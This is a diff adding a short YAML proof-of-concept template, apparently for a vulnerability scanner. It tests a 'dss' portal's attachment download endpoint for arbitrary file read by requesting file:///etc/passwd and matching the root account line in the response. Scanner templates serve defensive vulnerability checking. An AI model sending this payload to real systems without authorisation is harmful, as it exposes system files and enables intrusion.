@@ -1,0 +1,14 @@
+name: poc-yaml-dss-download-fileread
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            follow_redirects: true
+            path: /portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
+        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+expression: r0() 
+detail:
+    author: bytekobe
